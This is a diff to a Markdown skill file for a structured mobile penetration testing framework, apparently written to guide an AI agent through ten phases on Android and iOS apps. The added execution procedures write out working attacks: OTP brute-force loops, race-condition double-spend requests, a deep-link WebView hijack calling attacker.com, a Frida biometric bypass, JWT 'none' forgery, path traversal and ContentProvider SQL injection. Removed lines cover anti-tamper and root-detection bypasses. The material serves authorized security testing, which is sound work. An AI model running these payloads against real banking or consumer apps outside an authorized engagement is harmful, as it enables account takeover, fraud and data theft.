@@ -1,6 +1,6 @@
 ---
 name: mtest
-version: 2.0.0
+version: 2.1.0
 description: "Structured mobile application penetration testing framework with 10 gated phases for Android and iOS"
 tags: [mobile, pentest, android, ios, frida, security]
 trigger: "mobile pentest, mobile app test, APK test, IPA test, android security, ios security, dexguard bypass, appfence bypass, libaf-android, native root detection, inline svc bypass"
@@ -186,6 +186,45 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
 
 ---
 
+## Effort Allocation
+
+| Phase | % of Total Time | Rationale |
+|-------|----------------|-----------|
+| 1 Preflight | 5% | Setup, not testing |
+| 2 Static Analysis | 15% | Foundation — maps everything for later phases |
+| 3 Protection Bypass | 10% | Means to an end, not a finding itself (cap at decision tree limits) |
+| 4 Traffic Analysis | 10% | Capture baseline, map API surface |
+| 5 Attack Surface | 5% | Organize Phase 2+4 output into testable map |
+| 6 Runtime Testing | 15% | Dynamic validation of static findings |
+| 7 Vulnerability Analysis | 20% | Core testing — feature-by-feature exploitation |
+| 8 API Testing | 10% | Server-side validation (delegate to atest for depth) |
+| 9 Exploitation | 5% | Chain and prove — findings already identified |
+| 10 Reporting | 5% | Write-up (findings documented incrementally) |
+
+**Adjustment by context:**
+- **Bug bounty:** Compress Phases 1/4/5/10, expand Phase 7 (find one Critical fast)
+- **Internal pentest:** Even distribution, expand Phase 8 (comprehensive API coverage)
+- **Banking app:** Expand Phase 3 (bypass work) + Phase 8 (attestation-protected APIs)
+- **Offline/utility app:** Skip Phases 4/8, expand Phase 6 (local storage, IPC, deep links)
+
+---
+
+## App-Type Decision Tree
+
+Determine app type after Phase 2 static analysis. Load full decision tree: `skill_view(name='mtest', file_path='references/app-type-decision-tree.md')`
+
+**Quick summary:** Banking (heavy bypass + IDOR) | Social (deep links + WebView + API) | Utility (local storage + IPC) | Game/Unity (metadata + native RE) | Flutter (libapp.so strings + BoringSSL bypass)
+
+---
+
+## Bug Bounty Fast-Path
+
+Optimized for finding one Critical/High fast. Load full guide: `skill_view(name='mtest', file_path='references/bug-bounty-fast-path.md')`
+
+**TL;DR:** Static (30min) → Bypass (if pinned) → Traffic (15min) → Skip to Phase 7 highest-value features → Exploit → Submit. Time budget: 4-8 hours per app.
+
+---
+
 ## Phase 1: Preflight
 
 ### Gate: scope.md exists, target app identified, tools verified
@@ -248,6 +287,13 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
 
 ### Gate: decompilation complete, secrets scan done, endpoints extracted, framework identified
 
+**Fast-path priority (do these first, depth checks 7-15 after):**
+1. Decompile + framework detection (steps 1-2)
+2. Manifest: exported components, debuggable, allowBackup (step 3)
+3. Deep links + WebView + JS bridge (step 6)
+4. Secrets: API keys, hardcoded creds (step 4)
+5. Endpoints: all URLs, API paths (step 5)
+
 **Steps:**
 
 1. Decompile and disassemble:
@@ -266,88 +312,52 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    class-dump ipa_out/Payload/*.app/* > headers.h
    ```
 
-1b. Cross-platform framework detection:
+2. Cross-platform framework detection:
    ```bash
-   # Detect framework from APK contents
    unzip -l target.apk | grep -qE "libflutter\.so|libapp\.so" && echo "FLUTTER DETECTED"
    unzip -l target.apk | grep -qE "index\.android\.bundle|libjsc\.so|libhermes\.so" && echo "REACT NATIVE DETECTED"
    unzip -l target.apk | grep -qE "assemblies/.*\.dll|libmonodroid\.so" && echo "XAMARIN DETECTED"
    ```
 
-   **Flutter (libflutter.so + libapp.so):**
-   - App logic is compiled to native ARM in `libapp.so` (Dart AOT snapshot) — jadx only shows the thin Flutter engine wrapper
-   - `libapp.so` snapshot analysis: use `blutter` or `darter` to extract class/method names from the Dart snapshot
-   - Traffic interception: Flutter uses its own HTTP stack (dart:io) that ignores system proxy and system CA store. Use `reFlutter` to patch `libflutter.so` with proxy settings, or hook `ssl_crypto_x509_session_verify_cert_chain` in `libflutter.so`
-   - Dart AOT limitations: no source maps, no string-based decompilation — analysis is primarily at the snapshot metadata + native disassembly level
-   - **String literals ARE preserved in Dart AOT snapshots.** API paths, URLs, JSON field names, class names, and package paths all survive compilation as readable strings in `libapp.so`. This is the PRIMARY static analysis technique for Flutter apps:
-     ```bash
-     # Extract ALL API endpoints (often 200-400 for banking apps)
-     strings lib/arm64-v8a/libapp.so | grep -E "^/(bff-mobile|auth|account|api)" | sort -u
-     # Extract base URLs
-     strings lib/arm64-v8a/libapp.so | grep -iE "^https?://" | sort -u
-     # Extract data model classes (reveals request/response structure)
-     strings lib/arm64-v8a/libapp.so | grep -iE "Model\.(fromJson|toJson)" | sort -u
-     # Extract Dart package paths (reveals app architecture)
-     strings lib/arm64-v8a/libapp.so | grep "^package:" | sort -u
-     # Extract JSON field names (request parameters)
-     strings lib/arm64-v8a/libapp.so | grep -oE '[a-z][a-zA-Z0-9]*' | sort -u | grep -xE '(accountNumber|password|pin|otp|...)'
-     # Find IDOR targets (path template variables)
-     strings lib/arm64-v8a/libapp.so | grep -E "\{\{[a-zA-Z]+\}\}" | sort -u
-     ```
-   - jadx is still useful for: native Android components, third-party SDK configs, WebView implementations, security SDK code
+   **Framework-specific analysis:** Load `references/static-analysis.md` for full Flutter/RN/Xamarin methodology.
 
-   **React Native (index.android.bundle or libjsc.so/libhermes.so):**
-   - Bundle extraction: `unzip target.apk assets/index.android.bundle` — this is the JS source (possibly minified/bundled)
-   - If using Hermes engine (`libhermes.so`): the bundle is Hermes bytecode (`.hbc`), not plain JS. Decompile with `hbc-decompiler` or `hermes-dec`
-   - Source map check: look for `index.android.bundle.map` in assets or fetch `<bundle_url>.map` from the server — if present, gives full original source
-   - Plain JSC bundle (`libjsc.so`): bundle is readable JS, just beautify with `js-beautify`
-   - API keys, tokens, and endpoints are commonly embedded in the JS bundle — grep extensively
-   - Hook JS runtime via Frida: `Java.perform(() => { var module = Java.use('com.facebook.react.bridge.CatalystInstance'); ... })`
+   **Flutter quick-start (most common for banking apps):**
+   - jadx only shows thin wrapper — real logic in `libapp.so`
+   - Primary technique: `strings lib/arm64-v8a/libapp.so | grep -E "^/(api|auth|account)" | sort -u`
+   - Also extract: base URLs, package paths, JSON field names, IDOR path templates
+   - SSL bypass requires `flutter_ssl_bypass.js` + iptables DNAT (standard hooks don't work)
 
-   **Xamarin (assemblies/*.dll + libmonodroid.so):**
-   - DLL extraction: `unzip target.apk assemblies/*` — .NET assemblies contain the app logic
-   - Decompilation: use `monodis` (Mono disassembler), ILSpy, or dnSpy on extracted DLLs — produces near-original C# source
-   - Assemblies may be AOT-compiled (look for `.dll.so` files) — in that case, the .dll still contains metadata but method bodies are native
-   - Mono runtime hooking via Frida: hook `mono_jit_runtime_invoke` or specific managed methods via `Mono.Cecil` method tokens
-   - Look for `Xamarin.Essentials` usage — SecureStorage keys, preferences, and connectivity checks
-   - Network: Xamarin uses platform HTTP handlers — standard proxy/SSL bypass approaches work (unlike Flutter)
-
-2. Manifest/Info.plist analysis:
+3. Manifest/Info.plist analysis:
    - Android: debuggable, allowBackup, exported components, network security config
    - iOS: ATS exceptions, URL schemes, entitlements
 
-3. Secrets hunting:
+4. Secrets hunting:
    - API keys, tokens, credentials in source
    - Firebase/cloud URLs
    - Private keys/certs in assets
    - Base64-encoded secrets
 
-4. Endpoint extraction:
+5. Endpoint extraction:
    - All HTTP(S) URLs in source
    - API path patterns
    - WebSocket endpoints
    - Third-party service integrations
 
-5. Deep link → WebView hijack analysis (when deep links route to WebViews):
-   - Find all `@DeepLink` annotations that contain "web" or "url" in the route
-   - Check if the handler passes `bundle.getString("url")` to a WebView without validation
-   - Check if the WebView has `addJavascriptInterface` — if yes, map ALL `@JavascriptInterface` methods
-   - Check if multiple deep link routes delegate to the same vulnerable handler
-   - Check for HTTPS app link → internal deep link conversion (e.g., `https://app.link/path` → `appscheme://path`)
-   - **Check for SecureWebView pattern:** Does the WebView subclass override `loadUrl()` with a domain allowlist check? Look for `super.loadUrl()` gated behind a boolean, and config keys like `DOMAIN_WHITELIST_BATCH_*`. If present, the finding is Medium (not Critical) unless allowlist is bypassable.
-   - **Check for feature flags:** If the allowlist logic has branching paths controlled by `getValue()` or remote config booleans, the behavior differs between flag ON/OFF. Static analysis CANNOT determine which path runs in production. Mark finding as Probable until dynamically verified on a non-rooted production device.
-   - If unvalidated URL + JS bridge + NO allowlist: **Critical (Confirmed)** — document all entry points and bridge methods
-   - If unvalidated URL + JS bridge + server-side allowlist: **Medium (Probable)** — document the allowlist as mitigating control and look for bypasses (open redirects on allowed domains, `allowAllAccess` partners, scheme bypass)
-   - If unvalidated URL + JS bridge + allowlist with feature-flag-dependent bypass: **Medium (Theoretical)** — the bypass may work when flag is OFF but you cannot verify production flag state without dynamic testing on a non-rooted device
-   - See `deeplink-webview-hijack.md` for full exploitation patterns
+6. Deep link → WebView hijack analysis (when deep links route to WebViews):
+   - Find all `@DeepLink` annotations containing "web" or "url" in the route
+   - Check if handler passes unvalidated URL to WebView
+   - Check if WebView has `addJavascriptInterface` — map ALL `@JavascriptInterface` methods
+   - Check for SecureWebView pattern (domain allowlist gating `loadUrl()`)
+   - Check for feature flags controlling allowlist behavior (static analysis CANNOT determine production state)
+   - See `deeplink-webview-hijack.md` for full exploitation patterns and severity rating matrix
 
-6. Unsafe file operations (path traversal vectors):
+7. Unsafe file operations (path traversal vectors):
    - `Uri.getLastPathSegment()` used as filename without sanitization
    - `new File(base, userInput)` with no canonical path check
    - `System.load()` / `System.loadLibrary()` from writable paths (getFilesDir, getCacheDir)
    - Deep link handlers that download and save files from attacker-controlled URIs
 
-6a. Intent URI parsing (intent scheme hijacking):
+7a. Intent URI parsing (intent scheme hijacking):
    - Search for `Intent.parseUri(` — if the app parses user-controlled strings as intent URIs, this is a **high-value target**
    - Check what flags are passed: `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)` (flag=1) allows full intent specification
    - Check if result is launched via `startActivity()` — enables launching non-exported activities
@@ -355,7 +365,7 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - Common pattern: app allows `intent:` scheme in URL fields → attacker crafts `intent:#Intent;component=pkg/.InternalActivity;end`
    - **Key question:** Where does the URL string come from? If from user input, database, backup file, or deep link parameter — it's attacker-controlled
 
-6b. Backup/restore as input validation bypass:
+7b. Backup/restore as input validation bypass:
    - Check if app implements its own backup (not just `allowBackup` in manifest)
    - Look for: JSON/XML export to external storage, plaintext file writes to `getExternalFilesDir()`
    - **Critical check:** Does the restore path apply the SAME validation as the UI input path?
@@ -363,7 +373,7 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - If backup is plaintext on external storage → any app (or adb) can modify it → inject payloads that bypass UI validation
    - Look for: `Gson.fromJson()`, `JSONObject()`, `ObjectInputStream` reading from external files without sanitization
 
-7. Native library analysis (when .so files present):
+8. Native library analysis (when .so files present):
    - List imports: `readelf -d lib/arm64-v8a/lib*.so` or `strings` + grep
    - **Dangerous imports:** `system`, `exec`, `popen`, `dlopen`, `Runtime.exec`
    - Check for embedded command strings: `strings lib.so | grep -iE "sh|bin|cmd|log|exec"`
@@ -375,7 +385,7 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - **Native "enabler" pattern:** Check what native functions ADD to objects, not just what they remove. A "sanitizer" that strips dangerous extras but then adds a validation flag (e.g., `putExtra("IS_VALID", true)`) makes the native function the enabler, not the blocker. Reverse the full function — don't stop at the first `removeExtra` call.
    - **Intent manipulation in native code:** Look for JNI calls to `putExtra`, `removeExtra`, `setData`, `setComponent`, `setPackage`, `getBooleanExtra`. Map the full sequence: what's removed vs what's added. The final state of the intent after native processing is what matters.
 
-8. WebView + JavaScript bridge analysis (when WebView with JS enabled found):
+9. WebView + JavaScript bridge analysis (when WebView with JS enabled found):
    - Check for `addJavascriptInterface()` — exposes Java/native methods to JS
    - Map ALL `@JavascriptInterface` methods — these are the attack surface from any loaded page
    - Check if WebView loads attacker-controlled URLs (deep links, intent extras, no domain restriction)
@@ -385,21 +395,21 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - If bridge exposes native methods with buffer operations → combine with native overflow analysis
    - If app accepts any http/https URL via deep link + has JS bridge → **remote RCE candidate**
 
-9. Crypto analysis (when encryption/decryption is found):
+10. Crypto analysis (when encryption/decryption is found):
    - Identify algorithm, mode, padding (e.g., AES/ECB/PKCS5Padding)
    - Check key derivation: hardcoded? small keyspace? no stretching?
    - Check for hardcoded ciphertext that can be attacked offline
    - If key is derived from user input (PIN, password): estimate brute-force time
    - Write a cracking script immediately if keyspace < 10M (runs in seconds)
 
-10. Exported component analysis:
+11. Exported component analysis:
    - Identify all exported Activities, BroadcastReceivers, Services, ContentProviders
    - Check for permission protection (custom permissions, signature level)
    - Map intent-filters and actions — these are the external attack surface
    - BroadcastReceivers with no permission = any app can trigger them
    - Dynamic receivers registered without RECEIVER_NOT_EXPORTED flag (Android 14+ requirement)
 
-11. Deserialization / unsafe parsing:
+12. Deserialization / unsafe parsing:
    - **SnakeYAML `yaml.load()`** — instantiates arbitrary classes via `!!` tag. Safe alternative: `new Yaml(new SafeConstructor())` or `yaml.loadAs(input, Map.class)`
    - **Jackson `ObjectMapper`** with `enableDefaultTyping()` or `@JsonTypeInfo(use=CLASS)` → polymorphic RCE
    - **ObjectInputStream** — Java native deserialization, gadget chains
@@ -410,7 +420,7 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - Check input source: user-controlled (intents, file pickers, network) = exploitable
    - If found: write exploit payload immediately (see `deserialization-attacks.md`, `yaml-deserialization-rce.md`)
 
-12. Exported ContentProvider analysis:
+13. Exported ContentProvider analysis:
    - Identify all providers with `android:exported="true"` and no `android:permission`
    - Check `query()` for SQL injection (raw string concatenation in selection)
    - Check `openFile()` for path traversal (unsanitized `getLastPathSegment()`)
@@ -418,11 +428,11 @@ After completing an MHL challenge or real engagement, generate a DKatalis engine
    - Test access: `adb shell content query --uri content://<authority>`
    - See `content-provider-attacks.md` for exploitation patterns
 
-13. Binary protections check:
+14. Binary protections check:
    - Android: ProGuard/R8 obfuscation, native libs
    - iOS: PIE, stack canary, ARC, code signing
 
-14. Automated scanning:
+15. Automated scanning:
    ```bash
    # MobSF (comprehensive)
    docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
@@ -485,7 +495,7 @@ This phase assesses and bypasses client-side protections (RASP, root detection, 
    ```
 
 4. Anti-tampering bypass (DexGuard/AppFence/Eversafe):
-   - See Operational Notes → DexGuard section for full methodology
+   - See `references/operational-notes.md` → DexGuard section for full methodology
    - Priority order: Shamiko+Zygisk > hluda-server > Frida Gadget > non-rooted device > static evidence only
    - Apply "When to Stop Chasing a Bypass" decision tree
 
@@ -572,6 +582,8 @@ This phase assesses and bypasses client-side protections (RASP, root detection, 
 
 This phase creates the structured map that drives Phase 7 (Vulnerability Analysis). Every testable feature is catalogued with its entry points, data sensitivity, and applicable vulnerability classes.
 
+**Auto-generation:** Build attack-surface-map.md directly from Phase 2 exported components + deep links + Phase 4 API endpoints. Don't re-discover — organize what you already found.
+
 **Steps:**
 
 1. Enumerate all user-facing features from:
@@ -639,6 +651,17 @@ This phase creates the structured map that drives Phase 7 (Vulnerability Analysi
 ## Phase 6: Runtime Testing
 
 ### Gate: at least 3 test categories completed from the checklist below; data storage inspected; deep links tested
+
+**Prioritization (hit these in order for maximum finding density):**
+1. **Data Storage** — fastest, often yields Low-Medium findings in minutes (plaintext tokens, PII in SharedPrefs, unencrypted Hive)
+2. **Deep Link / URL Scheme Injection** — high-value, especially if Phase 2 found WebView + JS bridge
+3. **Intent/IPC Injection** — if exported components found in Phase 2, test them now
+4. **WebView Attacks** — only if JS bridge identified in Phase 2 static analysis
+5. **Biometric/PIN Bypass** — only if client-side-only auth detected (check if server validates)
+6. **Screenshot/Screen Recording** — quick check, usually Low severity
+7. **Binary Patching** — last resort, time-intensive, only if specific bypass needed
+
+**Skip guidance:** If Phase 2 found no exported components → skip #3. If no WebView with JS enabled → skip #4. If biometric is server-validated → skip #5. Don't test everything blindly — let Phase 2 findings guide you.
 
 **Production Validation Rule:** Before any finding can be rated Critical (Confirmed), it MUST be demonstrated on a non-rooted production device with a logged-in user account. Findings validated only on rooted/instrumented devices are capped at High (Probable) because:
 - Feature flags may behave differently on rooted vs non-rooted
@@ -721,7 +744,7 @@ If you cannot test on a non-rooted device, explicitly state this limitation and 
    ```
 
 5. **Biometric/PIN Bypass:**
-   - Hook biometric callbacks via Frida
+   - Hook biometric callbacks via Frida (see Phase 7 Execution Procedures → #7)
    - Check if auth is client-side only vs server-validated
    - Test fallback mechanisms
 
@@ -793,7 +816,122 @@ Save one file per feature in `phase7-vuln-analysis/per-feature/`:
 [Observations, partial findings, things to revisit in Phase 9]
 ```
 
-### Vulnerability Classes Reference (apply per-feature)
+### Execution Procedures (top 10 mobile vulns)
+
+**1. IDOR (most common High+ finding):**
+```bash
+# Capture a request with your user ID (from Phase 4 traffic)
+# In Burp Repeater: swap your ID with another user's ID
+# Test: account number, user ID, transaction ID, document ID
+curl -s "$BASE/api/user/profile?id=VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN"
+# If you get victim's data → IDOR confirmed
+# Also test: sequential IDs (id=1001 → id=1002), UUID enumeration, negative IDs
+```
+
+**2. OTP Bypass:**
+```bash
+# a) Null OTP: send empty or "000000"
+curl -s "$BASE/auth/verify-otp" -d '{"otp":""}' -H "Authorization: Bearer $TOKEN"
+# b) Reuse: use same OTP twice
+# c) Expired: wait past TTL, resend same OTP
+# d) Race condition: send 2 verify requests simultaneously with same OTP
+# e) Brute force: if no rate limit, try all 6-digit codes (needs automation)
+for i in $(seq 100000 999999); do
+  curl -s "$BASE/auth/verify-otp" -d "{\"otp\":\"$i\"}" -H "Auth: Bearer $TOKEN" | grep -q "success" && echo "FOUND: $i" && break
+done
+```
+
+**3. Race Condition (double-spend):**
+```bash
+# Prepare N identical transfer requests, fire simultaneously
+# Using GNU parallel:
+seq 1 10 | parallel -j10 "curl -s '$BASE/transfer' -d '{\"amount\":100,\"to\":\"ACCT\"}' -H 'Auth: Bearer $TOKEN'"
+# Or Burp Turbo Intruder / Repeater "Send group in parallel"
+# Check: did balance decrease by 100 or 1000? Did recipient get 1x or 10x?
+```
+
+**4. Deep Link → WebView Hijack:**
+```bash
+# From Phase 2: identified deep link that loads URL in WebView
+adb shell am start -a android.intent.action.VIEW -d "appscheme://webview?url=https://attacker.com/xss.html" <package>
+# If WebView loads attacker URL → check for JS bridge methods
+# Escalate: inject JS that calls @JavascriptInterface methods
+# Example payload (xss.html): <script>AndroidBridge.executeCommand("id")</script>
+```
+
+**5. Path Traversal (file read/write):**
+```bash
+# Via ContentProvider:
+adb shell content read --uri "content://<authority>/../../etc/hosts"
+# Via deep link file download:
+adb shell am start -d "appscheme://download?file=../../../data/data/<pkg>/shared_prefs/secrets.xml" <package>
+# Via intent extra:
+adb shell am start -n <package>/.FileViewerActivity --es "path" "../../../../etc/passwd"
+```
+
+**6. Exported Component Abuse:**
+```bash
+# Launch non-protected activity directly (skip auth):
+adb shell am start -n <package>/.internal.AdminActivity
+# Send broadcast to unprotected receiver:
+adb shell am broadcast -a <package>.RESET_PIN --es "new_pin" "0000"
+# Query exported ContentProvider:
+adb shell content query --uri "content://<authority>/users" --projection "name:password"
+```
+
+**7. Biometric Bypass (client-side):**
+```javascript
+// Frida: hook BiometricPrompt callback to always succeed
+Java.perform(function() {
+  var cb = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
+  cb.onAuthenticationSucceeded.implementation = function(result) {
+    console.log("[*] Biometric bypassed");
+    this.onAuthenticationSucceeded(result);
+  };
+  cb.onAuthenticationFailed.implementation = function() {
+    console.log("[*] Suppressing failure");
+  };
+});
+// If app proceeds without server validation → finding confirmed
+```
+
+**8. JWT Manipulation:**
+```bash
+# Decode JWT: echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
+# Test "none" algorithm:
+# Header: {"alg":"none","typ":"JWT"} → base64url
+# Keep payload, remove signature: header.payload.
+curl -s "$BASE/api/me" -H "Authorization: Bearer $NONE_TOKEN"
+# Test expired token reuse: use token past exp claim
+# Test role escalation: change "role":"user" to "role":"admin"
+```
+
+**9. SQL Injection (ContentProvider):**
+```bash
+# Basic test:
+adb shell content query --uri "content://<authority>/items" --where "1=1) OR 1=1--"
+# Extract data:
+adb shell content query --uri "content://<authority>/items" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
+# If app crashes or returns unexpected data → SQLi confirmed
+```
+
+**10. Insecure Data Storage:**
+```bash
+# Pull all app data (rooted):
+adb shell "su -c 'tar czf /sdcard/appdata.tar.gz /data/data/<package>/'"
+adb pull /sdcard/appdata.tar.gz
+tar xzf appdata.tar.gz
+# Check SharedPrefs for tokens/PII:
+grep -riE "token|jwt|password|pin|account" data/data/<package>/shared_prefs/
+# Check databases:
+sqlite3 data/data/<package>/databases/*.db ".dump" | grep -iE "password|token|secret"
+# Check Hive (Flutter):
+strings data/data/<package>/app_flutter/*.hive | grep -iE "bearer|jwt|refresh"
+```
+
+---
+
+### Vulnerability Classes Checklist (apply per-feature)
 
 **Authentication & Session:**
 - Brute force / rate limiting bypass
@@ -881,6 +1019,20 @@ Save one file per feature in `phase7-vuln-analysis/per-feature/`:
 
 ### Gate: at least BOLA, auth bypass, and injection tests completed (OR documented N/A with justification if no server-side API exists)
 
+**Delegation to atest:** Phase 8 focuses on mobile-API-specific patterns (attestation replay, device-bound tokens, mobile headers). For comprehensive API testing (full BOLA sweep, injection matrix, business logic), invoke `atest` with the API surface mapped in Phase 4. Pass:
+- Base URLs from traffic capture
+- Auth mechanism (JWT + attestation token structure)
+- API type (REST/GraphQL/gRPC)
+- Any rate limit observations from Phase 4
+
+**Mobile-API-specific patterns (test these HERE, not in atest):**
+- Device attestation token replay (Eversafe, Play Integrity, AppAttest)
+- Mobile-specific headers manipulation (`x-device-id`, `x-app-version`, `x-platform`, `x-cuid`)
+- App version downgrade — older API versions may lack attestation checks
+- Push notification token theft → impersonate device
+- Device registration endpoint abuse (register multiple devices, steal sessions)
+- Certificate pinning bypass → capture tokens that are normally invisible to proxy
+
 **Eversafe/attestation-protected APIs — partial unblock workflow:**
 
 When direct API replay is blocked by device attestation tokens (Eversafe, AppAttest, etc.), use this time-boxed approach:
@@ -905,43 +1057,43 @@ When direct API replay is blocked by device attestation tokens (Eversafe, AppAtt
 
 If the attestation token itself expires before you can test (< 5 min validity), mark Phase 8 as N/A with justification. The token replay window is the practical limit of what's testable without RE of the native attestation library.
 
-**Steps:**
+**Steps (mobile-specific only — delegate general API testing to atest):**
 
-1. **BOLA/IDOR:**
-   - Swap user IDs, account numbers, transaction IDs
-   - Test horizontal access (user A accessing user B's data)
-   - Test vertical access (regular user accessing admin endpoints)
+1. **Device attestation replay:**
+   - Capture attestation token (Eversafe, Play Integrity, AppAttest) from proxy
+   - Replay within JWT TTL window (typically 5 min for banking apps)
+   - Test if attestation token is bound to specific request or reusable across endpoints
+   - Check if token expiry is shorter than JWT expiry (limits testing window)
 
-2. **Authentication Bypass:**
-   - Remove/modify Authorization header
-   - JWT manipulation (none algorithm, key confusion, expired token reuse)
-   - OTP bypass (rate limit, reuse, predictable)
-   - Password reset flow abuse
+2. **Mobile header manipulation:**
+   - Remove/swap `x-device-id` — does server enforce device binding?
+   - Downgrade `x-app-version` — do older versions skip attestation checks?
+   - Change `x-platform` (android→ios, ios→android) — different validation paths?
+   - Swap `x-cuid` / customer ID headers — IDOR via header (not body/path)
 
-3. **Injection:**
-   - SQL injection in API parameters
-   - NoSQL injection (MongoDB operators)
-   - Command injection in file processing
-   - GraphQL injection (introspection, batching)
+3. **App version downgrade:**
+   - Find older API base paths (v1, v2 vs current v3) from static analysis
+   - Test if older endpoints still respond without attestation
+   - Check if deprecated endpoints expose more data or skip auth checks
 
-4. **Business Logic:**
-   - Negative amounts in transfers
-   - Race conditions (double-spend, parallel requests)
-   - Step skipping in multi-step flows
-   - Coupon/promo code abuse
+4. **Device registration abuse:**
+   - Register multiple devices to same account — does it invalidate previous sessions?
+   - Steal push notification token → impersonate device for server-push
+   - Test device limit enforcement (register 100 devices, check if old ones are revoked)
 
-5. **Rate Limiting & Brute Force:**
-   - OTP brute force
-   - Login attempts
-   - API abuse (scraping, enumeration)
+5. **Attestation-free endpoints:**
+   - Map which endpoints require attestation vs which don't (compare headers across captured requests)
+   - Pre-auth endpoints (login, register, forgot-password) often skip attestation — test these for injection/logic bugs directly
+   - Health/status/config endpoints may leak internal info without attestation
 
-6. **Data Exposure:**
-   - Excessive data in responses
-   - Debug endpoints accessible
-   - Stack traces in errors
-   - Internal IPs/paths leaked
+**Delegation to atest:** For comprehensive BOLA/IDOR sweep, injection matrix, auth bypass, business logic, and rate limiting — invoke `atest` with:
+- Base URLs from Phase 4 traffic capture
+- Auth mechanism (JWT structure, attestation token format)
+- API type (REST/GraphQL/gRPC)
+- Rate limit observations from Phase 4
+- Any endpoints that work without attestation (test these first in atest)
 
-**Cross-reference:** Load ptest skill's `enumeration.md` and `attack-surface.md` for comprehensive API testing techniques.
+**Cross-reference:** Load `atest` skill for full API testing methodology. Load ptest `references/geo-restriction-bypass.md` if API is geo-blocked.
 
 ---
 
@@ -1093,15 +1245,7 @@ This phase separates "finding a bug" from "proving exploitability." Every Critic
 
 ## Operational Notes
 
-### General
-
-- Always test on a **dedicated device/emulator** — never on a personal device with real accounts
-- Some apps detect emulators (check for `generic`, `sdk`, `genymotion` in Build properties) — prefer rooted physical device
-- iOS testing requires a **jailbroken device** for most dynamic tests — checkra1n (A11 and below) or palera1n (A11-A16)
-- Save all Frida scripts to `phase3-protection/scripts/` for reproducibility
-- When app uses certificate transparency or multiple pinning layers, combine approaches (Frida + patched config + invisible proxy)
-- **Client-side only** findings (no server validation) are typically Medium unless they expose sensitive data
-- Cross-reference extracted API endpoints with ptest skill for comprehensive server-side testing
+**Full operational notes moved to `references/operational-notes.md`.** Load with `skill_view(name='mtest', file_path='references/operational-notes.md')` when you hit a specific problem.
 
 **Cross-skill triggers from mtest:**
 - API endpoints discovered in traffic → invoke `atest` for structured AuthN/AuthZ testing
@@ -1110,236 +1254,5 @@ This phase separates "finding a bug" from "proving exploitability." Every Critic
 - Hardcoded secrets/source code in APK → invoke `scode` for review
 - Smart contract/Web3 SDK in app → invoke `w3hunt`
 - API geo-blocked from your location → see ptest `references/geo-restriction-bypass.md`
-- **Large app static analysis (50K+ classes):** Delegate Phase 2 analysis to a subagent via `delegate_task` with specific goals (deeplinks, secrets, exported components, network security, webview analysis). The subagent writes results to `phase2-static/android/` as separate markdown files. This preserves main context for exploitation phases. Works well for apps like Gojek (79K classes, 17 DEX files).
+- Large app static analysis (50K+ classes) → delegate Phase 2 to subagent via `delegate_task`
 
-### Split APK Merging
-
-Modern Play Store apps install as split APKs (base + config.arm64 + config.xxhdpi + config.en). **Always merge before analysis** — analyzing base.apk alone misses native libs, density-specific resources, and cross-module references.
-
-```bash
-java -jar APKEditor.jar m -i <dir_with_splits> -o merged.apk -f
-```
-
-- Tool: [REAndroid/APKEditor](https://github.com/REAndroid/APKEditor)
-- Produces a single APK with all DEX files, native libs, and resources combined
-- Always merge before running jadx — split analysis causes missing class errors and incomplete results
-- APKEditor also fixes `extractNativeLibs` and sanitizes the manifest automatically
-- **`extractNativeLibs="false"` handling:** When this flag is set, native .so files live inside the APK (not extracted to filesystem). `System.loadLibrary()` works via the APK's zip, but you can't `dlopen` from a custom path. For Frida hooking, use `Process.findModuleByName()` after the app loads the library itself. You cannot `System.loadLibrary()` arbitrary libs from Frida scripts — only the app's own loading path works.
-
-### Eversafe (kr.co.everspin) Anti-Tampering
-
-Korean anti-tampering SDK used by Indonesian fintech apps (Bank Jago, etc.). Runs as an isolated service (`EversafeService` with `android:isolatedProcess="true"`).
-
-**Key behavior difference:** Staging/dev builds often have relaxed Eversafe detection — the app stays alive on rooted devices with Frida attached. Always test staging builds first before investing in bypass work. Production builds may behave differently.
-
-**Detection indicators in manifest:**
-- `<service android:name="kr.co.everspin.eversafe.service.EversafeService" android:isolatedProcess="true"/>`
-- Native libs: `libeversafe.so`, `libeversafe-loader.so`
-
-**If Eversafe kills the app on production:**
-1. Try hluda-server (anti-detection Frida build) — solves Frida detection
-2. Shamiko + Zygisk — solves root detection at kernel level
-3. Non-rooted device with WiFi proxy — avoids all detection
-4. Submit findings with static evidence only
-
-### DexGuard / AppFence / Root Detection
-
-Enterprise apps (fintech, ride-hailing) use DexGuard with AppFence (`libaf-android.so`) and dedicated `ard` (App Root Detection) modules. Detection is heavily obfuscated via reflection (`C15197fsZ.c()`, `C15197fsZ.d()` patterns), often controlled by Firebase Remote Config (`RootCheckerRemoteConfig`).
-
-**Symptoms:** App launches then immediately dies with `Process exited cleanly (0)` in logcat (NOT a crash — it's `System.exit(0)`). Key grep: `grep -rl "DexGuard\|AppProtection\|isRooted\|RootChecker" sources/` to confirm.
-
-**Detection vectors:**
-1. `/proc/self/maps` — scans for non-whitelisted libraries (frida-agent strings)
-2. `/proc/net/tcp` — checks for port 27042 (frida default)
-3. `access()` for su/magisk/kernelsu paths
-4. Custom kernel string in `/proc/version`
-5. Inline `SVC #0` assembly — calls exit_group directly, bypassing ALL libc hooks
-
-**Kill chain (multi-layer):** (1) inline `SVC #0` (exit_group, bypasses ALL userspace hooks), (2) `syscall(94,0)` via libc wrapper, (3) `kill(getpid(), SIGKILL)` via dlsym'd function pointer, (4) `_exit(0)` + `abort()` fallbacks. Kill runs on a separate thread spawned via `pthread_create` with a configurable delay (`usleep(N*1000000)`). The library has integrity checks that detect on-disk patching (triggers SIGBUS).
-
-**Bypass approaches (priority order):**
-
-1. **Shamiko + Zygisk (kernel-level root hiding)** — most reliable, hides root from /proc entirely
